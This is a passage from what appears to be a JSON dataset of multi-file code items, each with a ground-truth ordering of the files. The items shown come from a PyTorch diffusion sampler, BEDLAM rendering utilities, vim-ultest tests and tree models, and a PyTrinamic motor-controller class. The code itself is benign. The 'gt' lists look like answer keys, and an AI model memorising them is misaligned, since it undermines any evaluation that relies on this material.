}\n        model_var_type_map = {\n            \"cifar10\": \"fixedlarge\",\n            \"lsun_bedroom\": \"fixedsmall\",\n            \"lsun_cat\": \"fixedsmall\",\n            \"lsun_church\": \"fixedsmall\",\n        }\n        ema = name.startswith(\"ema_\")\n        basename = name[len(\"ema_\"):] if ema else name\n        diffusion_config[\"model_var_type\"] = model_var_type_map[basename]\n\n        print(\"Instantiating\")\n        diffusion = cls(diffusion_config, model_config_map[basename], device)\n\n        ckpt = get_ckpt_path(name)\n        print(\"Loading checkpoint {}\".format(ckpt))\n        diffusion.model.load_state_dict(torch.load(ckpt, map_location=diffusion.device))\n        diffusion.model.to(diffusion.device)\n        diffusion.model.eval()\n        print(\"Moved model to {}\".format(diffusion.device))\n        return diffusion\n\n\n    def denoise(self, n, n_steps=None, x=None, curr_step=None,\n                progress_bar=lambda i, total=None: i,\n                callback=lambda x, i, x0=None: None):\n        with torch.no_grad():\n            if curr_step is None:\n                curr_step = self.num_timesteps\n\n            assert curr_step > 0, curr_step\n\n            if n_steps is None or curr_step-n_steps < 0:\n                n_steps = curr_step\n\n            if x is None:\n                assert curr_step == self.num_timesteps, curr_step\n\n                x = torch.randn(n, self.model.in_channels, self.model.resolution, self.model.resolution)\n                x = x.to(self.device)\n\n            for i in progress_bar(reversed(range(curr_step-n_steps, curr_step)), total=n_steps):\n                t = (torch.ones(n)*i).to(self.device)\n                x, x0 = denoising_step(x,\n                                       t=t,\n                                       model=self.model,\n                                       logvar=self.logvar,\n                                       sqrt_recip_alphas_cumprod=self.sqrt_recip_alphas_cumprod,\n                                       sqrt_recipm1_alphas_cumprod=self.sqrt_recipm1_alphas_cumprod,\n                                       posterior_mean_coef1=self.posterior_mean_coef1,\n                                       posterior_mean_coef2=self.posterior_mean_coef2,\n                                       return_pred_xstart=True)\n                callback(x, i, x0=x0)\n\n            return x\n\n\n    def diffuse(self, n, n_steps=None, x=None, curr_step=None,\n                progress_bar=lambda i, total=None: i,\n                callback=lambda x, i: None):\n        with torch.no_grad():\n            if curr_step is None:\n                curr_step = 0\n\n            assert curr_step < self.num_timesteps, curr_step\n\n            if n_steps is None or curr_step+n_steps > self.num_timesteps:\n                n_steps = self.num_timesteps-curr_step\n\n            assert x is not None\n\n            for i in progress_bar(range(curr_step, curr_step+n_steps), total=n_steps):\n                t = (torch.ones(n)*i).to(self.device)\n                x = diffusion_step(x,\n                                   t=t,\n                                   sqrt_alphas=self.sqrt_alphas,\n                                   sqrt_one_minus_alphas=self.sqrt_one_minus_alphas)\n                callback(x, i+1)\n\n            return x\n\n\n    @staticmethod\n    def torch2hwcuint8(x, clip=False):\n        if clip:\n            x = torch.clamp(x, -1, 1)\n        x = x.detach().cpu()\n        x = x.permute(0,2,3,1)\n        x = (x+1.0)*127.5\n        x = x.numpy().astype(np.uint8)\n        return x\n\n    @staticmethod\n    def save(x, format_string, start_idx=0):\n        import os, PIL.Image\n        os.makedirs(os.path.split(format_string)[0], exist_ok=True)\n        x = Diffusion.torch2hwcuint8(x)\n        for i in range(x.shape[0]):\n            PIL.Image.fromarray(x[i]).save(format_string.format(start_idx+i))\n\n\n\nif __name__ == \"__main__\":\n    import sys, tqdm\n    name = sys.argv[1] if len(sys.argv)>1 else \"cifar10\"\n    bs = int(sys.argv[2]) if len(sys.argv)>2 else 1\n    nb = int(sys.argv[3]) if len(sys.argv)>3 else 1\n    diffusion = Diffusion.from_pretrained(name)\n    for ib in tqdm.tqdm(range(nb), desc=\"Batch\"):\n        x = diffusion.denoise(bs, progress_bar=tqdm.tqdm)\n        idx = ib*bs\n        diffusion.save(x, \"results/\"+name+\"/{:06}.png\", start_idx=idx)\n\n'pytorch_diffusion/pytorch_diffusion/__init__.py'\n:from pytorch_diffusion.diffusion import Diffusion\nfrom pytorch_diffusion.model import Model\n",
        "gt": [
            "'pytorch_diffusion/pytorch_diffusion/ckpt_util.py'",
            "'pytorch_diffusion/pytorch_diffusion/diffusion.py'",
            "'pytorch_diffusion/pytorch_diffusion/__init__.py'"
        ]
    },
    {
        "files": [
            "'BEDLAM/train/utils/diff_renderer.py'",
            "'BEDLAM/train/utils/colorwheel.py'",
            "'BEDLAM/train/utils/smpl_uv.py'"
        ],
        "content": "'BEDLAM/train/utils/diff_renderer.py'\n:import torch\nimport numpy as np\nimport torch.nn as nn\n\nfrom pytorch3d.renderer import (\n        PerspectiveCameras,\n        RasterizationSettings,\n        DirectionalLights,\n        BlendParams,\n        HardFlatShader,\n        MeshRasterizer,\n        TexturesVertex,\n    )\nfrom pytorch3d.structures import Meshes\n\nfrom .smpl_uv import get_tenet_texture\nfrom .image_utils import get_default_camera\n\n\nclass MeshRendererWithDepth(nn.Module):\n\n\n    def __init__(self, rasterizer, shader):\n        super().__init__()\n        self.rasterizer = rasterizer\n        self.shader = shader\n\n    def forward(self, meshes_world, **kwargs) -> torch.Tensor:\n\n        fragments = self.rasterizer(meshes_world, **kwargs)\n        images = self.shader(fragments, meshes_world, **kwargs)\n\n        mask = (fragments.zbuf > -1).float()\n\n        zbuf = fragments.zbuf.view(images.shape[0], -1)\n\n        depth = (zbuf - zbuf.min(-1, keepdims=True).values) / \\\n                (zbuf.max(-1, keepdims=True).values - zbuf.min(-1, keepdims=True).values)\n        depth = depth.reshape(*images.shape[:3] + (1,))\n\n        images = torch.cat([images[:, :, :, :3], mask, depth], dim=-1)\n        return images\n\n\nclass DifferentiableRenderer(nn.Module):\n    def __init__(\n            self,\n            img_size,\n            focal_length,\n            device='cuda',\n            background_color=(0.0, 0.0, 0.0),\n            texture_mode='smplpix',\n            smpl_faces=None,\n    ):\n        super(DifferentiableRenderer, self).__init__()\n        self.x = 'a'\n        self.img_size = img_size\n        self.device = device\n        self.focal_length = focal_length\n        K, R = get_default_camera(focal_length, img_size)\n\n        T = torch.tensor([[0, 0, 2.5 * self.focal_length / self.img_size]])\n        self.background_color = background_color\n        self.renderer = None\n        smpl_faces = smpl_faces\n\n        face_colors = get_tenet_texture(mode=texture_mode).to(device).float()\n        vertex_colors = torch.from_numpy(\n            np.load(f'data/body_models/smpl/{texture_mode}_vertex_colors.npy')[:,:3]\n        ).unsqueeze(0).to(device).float()\n\n        self.register_buffer('K', K)\n        self.register_buffer('R', R)\n        self.register_buffer('T', T)\n        self.register_buffer('face_colors', face_colors)\n        self.register_buffer('vertex_colors', vertex_colors)\n        self.register_buffer('smpl_faces', smpl_faces)\n\n        self.set_requires_grad(False)\n\n    def set_requires_grad(self, val=False):\n        self.K.requires_grad_(val)\n        self.R.requires_grad_(val)\n        self.T.requires_grad_(val)\n        self.face_colors.requires_grad_(val)\n        self.vertex_colors.requires_grad_(val)\n        self.smpl_faces.requires_grad_(val)\n\n    def forward(self, vertices, faces=None, R=None, T=None):\n        raise NotImplementedError\n\n\nclass Pytorch3D(DifferentiableRenderer):\n    def __init__(\n            self,\n            img_size,\n            focal_length,\n            device='cuda',\n            background_color=(0.0, 0.0, 0.0),\n            texture_mode='smplpix',\n            smpl_faces=None,\n    ):\n        super(Pytorch3D, self).__init__(\n            img_size,\n            focal_length,\n            device=device,\n            background_color=background_color,\n            texture_mode=texture_mode,\n            smpl_faces=smpl_faces,\n        )\n\n\n\n\n        self.R = self.R @ torch.tensor(\n            [[[ -1.0,  0.0, 0.0],\n              [  0.0, -1.0, 0.0],\n              [  0.0,  0.0, 1.0]]],\n            dtype=self.R.dtype, device=self.R.device,\n        )\n\n        cameras = PerspectiveCameras(\n            device=self.device,\n            focal_length=self.focal_length,\n            principal_point=((self.img_size // 2, self.img_size // 2),),\n            R=self.R,\n            T=self.T,\n            image_size=((self.img_size, self.img_size),)\n        )\n\n        for param in cameras.parameters():\n            param.requires_grad_(False)\n\n        raster_settings = RasterizationSettings(\n            image_size=self.img_size,\n            blur_radius=0.0,\n            faces_per_pixel=1,\n        )\n\n        lights = DirectionalLights(\n            device=self.device,\n            ambient_color=((1.0, 1.0, 1.0),),\n            diffuse_color=((0.0, 0.0, 0.0),),\n            specular_color=((0.0, 0.0, 0.0),),\n            direction=((0, 1, 0),),\n        )\n\n        blend_params = BlendParams(background_color=self.background_color)\n\n        shader = HardFlatShader(device=self.device,\n                                cameras=cameras,\n                                blend_params=blend_params,\n                                lights=lights)\n\n        self.textures = TexturesVertex(verts_features=self.vertex_colors)\n        self.renderer = MeshRendererWithDepth(\n            rasterizer=MeshRasterizer(\n                cameras=cameras,\n                raster_settings=raster_settings\n            ),\n            shader=shader,\n        )\n\n    def forward(self, vertices, faces=None, R=None, T=None):\n        batch_size = vertices.shape[0]\n        if faces is None:\n            faces = self.smpl_faces.expand(batch_size, -1, -1)\n\n        if R is None:\n            R = self.R.expand(batch_size, -1, -1)\n\n        if T is None:\n            T = self.T.expand(batch_size, -1)\n\n\n        T = torch.bmm(R, T.unsqueeze(-1)).squeeze(-1)\n\n        textures = TexturesVertex(\n            verts_features=self.vertex_colors.expand(batch_size, -1, -1)\n        )\n\n        meshes = Meshes(verts=vertices, faces=faces, textures=textures)\n        images = self.renderer(meshes, R=R, T=T)\n        images = images.permute(0, 3, 1, 2)\n        return images\n\n\nclass NeuralMeshRenderer(DifferentiableRenderer):\n    def __init__(self, *args, **kwargs):\n        import neural_renderer as nr\n\n        super(NeuralMeshRenderer, self).__init__(*args, **kwargs)\n\n        self.neural_renderer = nr.Renderer(\n            dist_coeffs=None,\n            orig_size=self.img_size,\n            image_size=self.img_size,\n            light_intensity_ambient=1,\n            light_intensity_directional=0,\n            anti_aliasing=False,\n        )\n\n    def forward(self, vertices, faces=None, R=None, T=None):\n        batch_size = vertices.shape[0]\n        if faces is None:\n            faces = self.smpl_faces.expand(batch_size, -1, -1)\n\n        if R is None:\n            R = self.R.expand(batch_size, -1, -1)\n\n        if T is None:\n            T = self.T.expand(batch_size, -1)\n        rgb, depth, mask = self.neural_renderer(\n            vertices,\n            faces,\n            textures=self.face_colors.expand(batch_size, -1, -1, -1, -1, -1),\n            K=self.K.expand(batch_size, -1, -1),\n            R=R,\n            t=T.unsqueeze(1),\n        )\n        return torch.cat([rgb, depth.unsqueeze(1), mask.unsqueeze(1)], dim=1)\n'BEDLAM/train/utils/colorwheel.py'\n:import cv2\nimport numpy as np\n\n\ndef make_color_wheel_image(img_width, img_height):\n\n    hue = np.fromfunction(lambda i, j: (np.arctan2(i-img_height/2, img_width/2-j) + np.pi)*(180/np.pi)/2,\n                          (img_height, img_width), dtype=np.float)\n    saturation = np.ones((img_height, img_width)) * 255\n    value = np.ones((img_height, img_width)) * 255\n    hsl = np.dstack((hue, saturation, value))\n    color_map = cv2.cvtColor(np.array(hsl, dtype=np.uint8), cv2.COLOR_HSV2BGR)\n    return color_map\n\n\n'BEDLAM/train/utils/smpl_uv.py'\n:import torch\nimport trimesh\nimport numpy as np\nimport skimage.io as io\nfrom PIL import Image\nfrom smplx import SMPL\nfrom matplotlib import cm as mpl_cm, colors as mpl_colors\nfrom trimesh.visual.color import face_to_vertex_color, vertex_to_face_color\n\nfrom ..core.config import SMPL_MODEL_DIR\nfrom .colorwheel import make_color_wheel_image\n\n\ndef get_smpl_uv():\n    uv_obj = 'data/body_models/smpl_uv_20200910/smpl_uv.obj'\n\n    uv_map = []\n    with open(uv_obj) as f:\n        for line in f.readlines():\n            if line.startswith('vt'):\n                coords = [float(x) for x in line.split(' ')[1:]]\n                uv_map.append(coords)\n\n    uv_map = np.array(uv_map)\n\n    return uv_map\n\n\ndef show_uv_texture():\n\n    image = make_color_wheel_image(1024, 1024)\n    image = Image.fromarray(image)\n\n    uv = np.load('data/body_models/smpl_uv_20200910/uv_table.npy')\n    material = trimesh.visual.texture.SimpleMaterial(image=image)\n    tex_visuals = trimesh.visual.TextureVisuals(uv=uv, image=image, material=material)\n\n    smpl = SMPL(SMPL_MODEL_DIR)\n\n    faces = smpl.faces\n    verts = smpl().vertices[0].detach().numpy()\n\n\n    print(uv.shape)\n    vc = tex_visuals.to_color().vertex_colors\n    fc = trimesh.visual.color.vertex_to_face_color(vc, faces)\n    face_colors = fc.copy()\n    fc = fc.astype(float)\n    vc = vc.astype(float)\n    fc[:,:3] = fc[:,:3] / 255.\n    vc[:,:3] = vc[:,:3] / 255.\n    print(fc[:,:3].max(), fc[:,:3].min(), fc[:,:3].mean())\n    print(vc[:, :3].max(), vc[:, :3].min(), vc[:, :3].mean())\n    np.save('data/body_models/smpl/color_wheel_face_colors.npy', fc)\n    np.save('data/body_models/smpl/color_wheel_vertex_colors.npy', vc)\n    print(fc.shape)\n    mesh = trimesh.Trimesh(verts, faces, validate=True, process=False, face_colors=face_colors)\n\n\n\n\n\n    mesh.show()\n\n\ndef show_colored_mesh():\n    cm = mpl_cm.get_cmap('jet')\n    norm_gt = mpl_colors.Normalize()\n\n    smpl = SMPL(SMPL_MODEL_DIR)\n\n    faces = smpl.faces\n    verts = smpl().vertices[0].detach().numpy()\n\n    m = trimesh.Trimesh(verts, faces, process=False)\n\n    mode = 1\n    if mode == 0:\n\n        face_labels = m.triangles_center\n        face_colors = (face_labels - face_labels.min()) / np.ptp(face_labels)\n\n    elif mode == 1:\n\n        face_labels = m.triangles_center\n        face_labels = np.argsort(np.linalg.norm(face_labels, axis=-1))\n        face_colors = np.ones((13776, 4))\n        face_colors[:, 3] = 1.0\n        face_colors[:, :3] = cm(norm_gt(face_labels))[:, :3]\n    elif mode == 2:\n\n        fc = np.load('data/body_models/smpl_uv_20200910/data/vertex_texture.npy')[0, :, 0, 0, 0, :]\n        face_colors = np.ones((13776, 4))\n        face_colors[:, :3] = fc\n    mesh = trimesh.Trimesh(verts, faces, process=False, face_colors=face_colors)\n    mesh.show()\n\n\ndef get_tenet_texture(mode='smplpix'):\n\n\n    smpl = SMPL(SMPL_MODEL_DIR)\n\n    faces = smpl.faces\n    verts = smpl().vertices[0].detach().numpy()\n\n    m = trimesh.Trimesh(verts, faces, process=False)\n    if mode == 'smplpix':\n\n        face_labels = m.triangles_center\n        face_colors = (face_labels - face_labels.min()) / np.ptp(face_labels)\n        texture = np.zeros((1, faces.shape[0], 1, 1, 1, 3), dtype=np.float32)\n        texture[0, :, 0, 0, 0, :] = face_colors[:, :3]\n        texture = torch.from_numpy(texture).float()\n    elif mode == 'decomr':\n        texture = np.load('data/body_models/smpl_uv_20200910/data/vertex_texture.npy')\n        texture = torch.from_numpy(texture).float()\n    elif mode == 'colorwheel':\n        face_colors = np.load('data/body_models/smpl/color_wheel_face_colors.npy')\n        texture = np.zeros((1, faces.shape[0], 1, 1, 1, 3), dtype=np.float32)\n        texture[0, :, 0, 0, 0, :] = face_colors[:, :3]\n        texture = torch.from_numpy(texture).float()\n    else:\n        raise ValueError(f'{mode} is not defined!')\n\n\n    return texture\n\n\ndef save_tenet_textures(mode='smplpix'):\n\n\n    smpl = SMPL(SMPL_MODEL_DIR)\n\n    faces = smpl.faces\n    verts = smpl().vertices[0].detach().numpy()\n\n    m = trimesh.Trimesh(verts, faces, process=False)\n\n    if mode == 'smplpix':\n\n        face_labels = m.triangles_center\n        face_colors = (face_labels - face_labels.min()) / np.ptp(face_labels)\n        texture = np.zeros((1, faces.shape[0], 1, 1, 1, 3), dtype=np.float32)\n        texture[0, :, 0, 0, 0, :] = face_colors[:, :3]\n        texture = torch.from_numpy(texture).float()\n\n        vert_colors = face_to_vertex_color(m, face_colors).astype(float) / 255.0\n\n    elif mode == 'decomr':\n        texture = np.load('data/body_models/smpl_uv_20200910/data/vertex_texture.npy')\n        texture = torch.from_numpy(texture).float()\n        face_colors = texture[0, :, 0, 0, 0, :]\n        vert_colors = face_to_vertex_color(m, face_colors).astype(float) / 255.0\n\n    elif mode == 'colorwheel':\n        face_colors = np.load('data/body_models/smpl/color_wheel_face_colors.npy')\n        texture = np.zeros((1, faces.shape[0], 1, 1, 1, 3), dtype=np.float32)\n        texture[0, :, 0, 0, 0, :] = face_colors[:, :3]\n        texture = torch.from_numpy(texture).float()\n        face_colors[:, :3] *= 255\n        vert_colors = face_to_vertex_color(m, face_colors).astype(float) / 255.0\n    else:\n        raise ValueError(f'{mode} is not defined!')\n\n    print(vert_colors.shape, vert_colors.max())\n    np.save(f'data/body_models/smpl/{mode}_vertex_colors.npy', vert_colors)\n    return texture",
        "gt": [
            "'BEDLAM/train/utils/colorwheel.py'",
            "'BEDLAM/train/utils/smpl_uv.py'",
            "'BEDLAM/train/utils/diff_renderer.py'"
        ]
    },
    {
        "files": [
            "'vim-ultest/tests/unit/handler/parsers/test_file.py'",
            "'vim-ultest/rplugin/python3/ultest/models/types.py'",
            "'vim-ultest/rplugin/python3/ultest/models/__init__.py'",
            "'vim-ultest/rplugin/python3/ultest/models/tree.py'"
        ],
        "content": "'vim-ultest/tests/unit/handler/parsers/test_file.py'\n:from unittest.mock import Mock, patch\n\nimport pytest\n\nfrom rplugin.python3.ultest.handler.parsers import FileParser\nfrom rplugin.python3.ultest.models import Namespace, Test\nfrom rplugin.python3.ultest.models.file import File\nfrom rplugin.python3.ultest.models.namespace import Namespace\nfrom tests.mocks import get_test_file\n\nvim = Mock()\nvim.launch = lambda f, _: f()\nfile_parser = FileParser(vim)\n\n\n@patch(\"os.path.isfile\", lambda _: True)\n@pytest.mark.asyncio\nasync def test_parse_python_tests():\n    patterns = {\n        \"test\": [r\"\\v^\\s*%(async )?def (test_\\w+)\"],\n        \"namespace\": [r\"\\v^\\s*class (\\w+)\"],\n    }\n\n    file_name = get_test_file(\"python\")\n    tests = list(await file_parser.parse_file_structure(file_name, patterns))\n\n    expected = [\n        File(\n            id=file_name,\n            name=file_name,\n            file=file_name,\n            line=0,\n            col=0,\n            namespaces=[],\n            type=\"file\",\n        ),\n        Test(\n            id=tests[1].id,\n            name=\"test_a\",\n            file=file_name,\n            line=4,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"test\",\n        ),\n        Namespace(\n            id=tests[2].id,\n            name=\"TestAgain\",\n            file=file_name,\n            line=9,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"namespace\",\n        ),\n        Test(\n            id=tests[3].id,\n            name=\"test_d\",\n            file=file_name,\n            line=10,\n            col=1,\n            running=0,\n            namespaces=[tests[2].id],\n            type=\"test\",\n        ),\n        Test(\n            id=tests[4].id,\n            name=\"test_a\",\n            file=file_name,\n            line=16,\n            col=1,\n            running=0,\n            namespaces=[tests[2].id],\n            type=\"test\",\n        ),\n        Namespace(\n            id=tests[5].id,\n            name=\"TestMyClass\",\n            file=file_name,\n            line=25,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"namespace\",\n        ),\n        Test(\n            id=tests[6].id,\n            name=\"test_d\",\n            file=file_name,\n            line=26,\n            col=1,\n            running=0,\n            namespaces=[tests[5].id],\n            type=\"test\",\n        ),\n        Test(\n            id=tests[7].id,\n            name=\"test_a\",\n            file=file_name,\n            line=29,\n            col=1,\n            running=0,\n            namespaces=[tests[5].id],\n            type=\"test\",\n        ),\n        Test(\n            id=tests[8].id,\n            name=\"test_b\",\n            file=file_name,\n            line=33,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"test\",\n        ),\n    ]\n\n    assert tests == expected\n\n\n@patch(\"os.path.isfile\", lambda _: True)\n@pytest.mark.asyncio\nasync def test_parse_java_tests():\n    patterns = {\n        \"test\": [r\"\\v^\\s*%(\\zs\\@Test\\s+\\ze)?%(\\zspublic\\s+\\ze)?void\\s+(\\w+)\"],\n        \"namespace\": [r\"\\v^\\s*%(\\zspublic\\s+\\ze)?class\\s+(\\w+)\"],\n    }\n\n    file_name = get_test_file(\"java\")\n    tests = list(await file_parser.parse_file_structure(file_name, patterns))\n\n    expected = [\n        File(\n            id=file_name,\n            name=file_name,\n            file=file_name,\n            line=0,\n            col=0,\n            running=0,\n            namespaces=[],\n            type=\"file\",\n        ),\n        Namespace(\n            id=tests[1].id,\n            name=\"TestJunit1\",\n            file=file_name,\n            line=5,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"namespace\",\n        ),\n        Test(\n            id=tests[2].id,\n            name=\"testPrintMessage\",\n            file=file_name,\n            line=11,\n            col=1,\n            running=0,\n            namespaces=[tests[1].id],\n            type=\"test\",\n        ),\n    ]\n\n    assert tests == expected\n\n\n@patch(\"os.path.isfile\", lambda _: True)\n@pytest.mark.asyncio\nasync def test_parse_jest_tests():\n    patterns = {\n        \"test\": [r'\\v^\\s*%(it|test)\\s*[( ]\\s*%(\"|' '|`)(.*)%(\"|' \"|`)\"],\n        \"namespace\": [\n            r'\\v^\\s*%(describe|suite|context)\\s*[( ]\\s*%(\"|' '|`)(.*)%(\"|' \"|`)\"\n        ],\n    }\n\n    file_name = get_test_file(\"jest\")\n    tests = list(await file_parser.parse_file_structure(file_name, patterns))\n\n    expected = [\n        File(\n            id=file_name,\n            name=file_name,\n            file=file_name,\n            line=0,\n            col=0,\n            running=0,\n            namespaces=[],\n            type=\"file\",\n        ),\n        Namespace(\n            id=tests[1].id,\n            name='First namespace\", () => {',\n            file=file_name,\n            line=1,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"namespace\",\n        ),\n        Namespace(\n            id=tests[2].id,\n            name='Second namespace\", () => {',\n            file=file_name,\n            line=2,\n            col=1,\n            running=0,\n            namespaces=[tests[1].id],\n            type=\"namespace\",\n        ),\n        Test(\n            id=tests[3].id,\n            name=\"it shouldn't pass\\\", () => {\",\n            file=file_name,\n            line=3,\n            col=1,\n            running=0,\n            namespaces=[\n                tests[1].id,\n                tests[2].id,\n            ],\n            type=\"test\",\n        ),\n    ]\n\n    assert tests == expected\n\n\n@patch(\"os.path.isfile\", lambda _: True)\n@pytest.mark.asyncio\nasync def test_parse_namespace_structure():\n    patterns = {\n        \"test\": [r\"\\v^\\s*%(async )?def (test_\\w+)\"],\n        \"namespace\": [r\"\\v^\\s*class (\\w+)\"],\n    }\n\n    file_name = get_test_file(\"python\")\n    tests = await file_parser.parse_file_structure(file_name, patterns)\n\n    expected = [\n        File(\n            id=file_name,\n            name=file_name,\n            file=file_name,\n            line=0,\n            col=0,\n            namespaces=[],\n            type=\"file\",\n        ),\n        Test(\n            id=tests[1].id,\n            name=\"test_a\",\n            file=file_name,\n            line=4,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"test\",\n        ),\n        [\n            Namespace(\n                id=tests[2].id,\n                name=\"TestAgain\",\n                file=file_name,\n                line=9,\n                col=1,\n                running=0,\n                namespaces=[],\n                type=\"namespace\",\n            ),\n            Test(\n                id=tests[3].id,\n                name=\"test_d\",\n                file=file_name,\n                line=10,\n                col=1,\n                running=0,\n                namespaces=[tests[2].id],\n                type=\"test\",\n            ),\n            Test(\n                id=tests[4].id,\n                name=\"test_a\",\n                file=file_name,\n                line=16,\n                col=1,\n                running=0,\n                namespaces=[tests[2].id],\n                type=\"test\",\n            ),\n        ],\n        [\n            Namespace(\n                id=tests[5].id,\n                name=\"TestMyClass\",\n                file=file_name,\n                line=25,\n                col=1,\n                running=0,\n                namespaces=[],\n                type=\"namespace\",\n            ),\n            Test(\n                id=tests[6].id,\n                name=\"test_d\",\n                file=file_name,\n                line=26,\n                col=1,\n                running=0,\n                namespaces=[tests[5].id],\n                type=\"test\",\n            ),\n            Test(\n                id=tests[7].id,\n                name=\"test_a\",\n                file=file_name,\n                line=29,\n                col=1,\n                running=0,\n                namespaces=[tests[5].id],\n                type=\"test\",\n            ),\n        ],\n        Test(\n            id=tests[8].id,\n            name=\"test_b\",\n            file=file_name,\n            line=33,\n            col=1,\n            running=0,\n            namespaces=[],\n            type=\"test\",\n        ),\n    ]\n\n    assert tests.to_list() == expected\n\n'vim-ultest/rplugin/python3/ultest/models/types.py'\n:import sys\nfrom typing import Any\n\nif sys.version_info >= (3, 8):\n    from typing import Literal, Protocol\nelse:\n\n    class _Literal:\n        def __getitem__(self, a):\n            return Any\n\n    Literal = _Literal()\n\n    class Protocol:\n        ...\n\n'vim-ultest/rplugin/python3/ultest/models/__init__.py'\n:from typing import Union\n\nfrom .file import File\nfrom .namespace import Namespace\nfrom .result import Result\nfrom .test import Test\nfrom .tree import Tree\n\nPosition = Union[Test, File, Namespace]\n\n'vim-ultest/rplugin/python3/ultest/models/tree.py'\n:from typing import Callable, Generic, Iterator, List, Optional, TypeVar\n\nfrom .types import Protocol\n\nTreeData = TypeVar(\"TreeData\")\n\n\nC = TypeVar(\"C\")\n\n\nclass Comparabale(Protocol):\n    def __gt__(self: C, x: C) -> bool:\n        ...\n\n    def __lt__(self: C, x: C) -> bool:\n        ...\n\n    def __eq__(self, x) -> bool:\n        ...\n\n\nSearchKey = TypeVar(\"SearchKey\", bound=Comparabale)\n\n\nclass Tree(Generic[TreeData]):\n    def __init__(self, data: TreeData, children: List[\"Tree[TreeData]\"]) -> None:\n        self._children: List[Tree[TreeData]] = children\n        self._data = data\n        self._length = 1 + sum(len(child) for child in self._children)\n\n    def __repr__(self) -> str:\n        return f\"Tree(data={self._data}, children={self._children})\"\n\n    @classmethod\n    def from_list(cls, data) -> \"Tree[TreeData]\":\n\n        if isinstance(data, List):\n            node_data = data[0]\n            children = [cls.from_list(child_data) for child_data in data[1:]]\n\n            return Tree(data=node_data, children=children)\n        else:\n            return Tree(data=data, children=[])\n\n    def __len__(self) -> int:\n        return self._length\n\n    def __getitem__(self, index: int) -> TreeData:\n        orig = index\n        if index > len(self):\n            raise IndexError(f\"No node found with index {orig}\")\n\n        if index == 0:\n            return self._data\n\n        checked = 1\n        for child in self._children:\n            if len(child) > index - checked:\n                return child[index - checked]\n            checked += len(child)\n\n        raise Exception\n\n    def to_list(self):\n        if not self._children:\n            return [self._data]\n        return self._to_list()\n\n    def _to_list(self):\n        if not self._children:\n            return self._data\n        return [self._data, *[child._to_list() for child in self._children]]\n\n    @property\n    def data(self) -> TreeData:\n        return self._data\n\n    @property\n    def children(self) -> List[\"Tree\"]:\n        return self._children\n\n    def __iter__(self) -> Iterator[TreeData]:\n        yield self._data\n        for child in self._children:\n            for data in child:\n                yield data\n\n    def nodes(self) -> Iterator[\"Tree[TreeData]\"]:\n        yield self\n        for child in self._children:\n            for data in child.nodes():\n                yield data\n\n    def node(self, index: int) -> \"Tree[TreeData]\":\n        orig = index\n        if index > len(self):\n            raise IndexError(f\"No node found with index {orig}\")\n\n        if index == 0:\n            return self\n\n        checked = 1\n        for child in self._children:\n            if len(child) > index - checked:\n                return child.node(index - checked)\n            checked += len(child)\n\n        raise Exception\n\n    X = TypeVar(\"X\")\n\n    def map(self, f: Callable[[TreeData], X]) -> \"Tree[X]\":\n        try:\n            return Tree(\n                data=f(self._data), children=[child.map(f) for child in self._children]\n            )\n        except Exception:\n            breakpoint()\n            raise\n\n    def sorted_search(\n        self,\n        target: SearchKey,\n        key: Callable[[TreeData], SearchKey],\n        strict: bool = False,\n    ) -> Optional[\"Tree[TreeData]\"]:\n\n        l = 0\n        r = len(self) - 1\n        while l <= r:\n            m = int((l + r) / 2)\n            mid = self.node(m)\n            if key(mid.data) < target:\n                l = m + 1\n            elif key(mid.data) > target:\n                r = m - 1\n            else:\n                return mid\n\n        if r < 0:\n            return None\n\n        return self.node(r) if not strict and key(self[r]) < target else None\n\n    def search(\n        self,\n        target: SearchKey,\n        key: Callable[[TreeData], SearchKey],\n    ) -> Optional[\"Tree[TreeData]\"]:\n\n        if target == key(self.data):\n            return self\n        if not self.children:\n            return None\n        for child in self.children:\n            result = child.search(target, key)\n            if result:\n                return result\n",
        "gt": [
            "'vim-ultest/rplugin/python3/ultest/models/types.py'",
            "'vim-ultest/rplugin/python3/ultest/models/tree.py'",
            "'vim-ultest/rplugin/python3/ultest/models/__init__.py'",
            "'vim-ultest/tests/unit/handler/parsers/test_file.py'"
        ]
    },
    {
        "files": [
            "'PyTrinamic/pytrinamic/evalboards/TMC4671_eval.py'",
            "'PyTrinamic/pytrinamic/features/digital_hall_module.py'",
            "'PyTrinamic/pytrinamic/evalboards/TMC2160_eval.py'",
            "'PyTrinamic/examples/evalboards/TMC4671/TMC4671_eval_BLDC_ABN_encoder.py'",
            "'PyTrinamic/pytrinamic/features/__init__.py'",
            "'PyTrinamic/pytrinamic/evalboards/__init__.py'"
        ],
        "content": "'PyTrinamic/pytrinamic/evalboards/TMC4671_eval.py'\n:\n\n\n\n\n\n\n\nfrom pytrinamic.evalboards import TMCLEval\nfrom pytrinamic.ic import TMC4671\nfrom pytrinamic.features import MotorControlModule, LinearRampModule\n\n\nclass TMC4671_eval(TMCLEval):\n\n    def __init__(self, connection, module_id=1):\n        TMCLEval.__init__(self, connection, module_id)\n        self.motors = [self._MotorTypeA(self, 0)]\n        self.ics = [TMC4671(connection)]\n\n\n    def move_to(self, axis, position, velocity=None):\n        if velocity:\n            self.motors[axis].linear_ramp.max_velocity = velocity\n        self.connection.move_to(axis, position, self.module_id)\n\n    def move_by(self, axis, difference, velocity=None):\n        if velocity:\n            self.motors[axis].linear_ramp.max_velocity = velocity\n        self.connection.move_by(axis, difference, self.module_id)\n\n    def write_register(self, register_address, value):\n        return self._connection.write_mc(register_address, value, self._module_id)\n\n    def read_register(self, register_address, signed=False):\n        return self._connection.read_mc(register_address, self._module_id, signed)\n\n    class _MotorTypeA(MotorControlModule):\n        def __init__(self, eval_board, axis):\n            MotorControlModule.__init__(self, eval_board, axis, self.AP)\n            self.linear_ramp = LinearRampModule(eval_board, axis, self.AP)\n\n\n        class AP:\n            MaxVelocity                    = 4\n            MaxAcceleration                = 11\n            EnableRamp                     = 12\n            RampVelocity                   = 13\n            LinearScaler                   = 20\n            LinearMaxVelocity              = 21\n            LinearMaxAcceleration          = 22\n            LinearTargetPosition           = 25\n            TargetTorque                   = 171\n            PID_FLUX_TARGET                = 172\n            PID_VELOCITY_TARGET            = 173\n            TargetPosition                 = 174\n            ActualTorque                   = 176\n            ActualVelocity                 = 178\n            ActualPosition                 = 179\n            TargetTorqueRaw    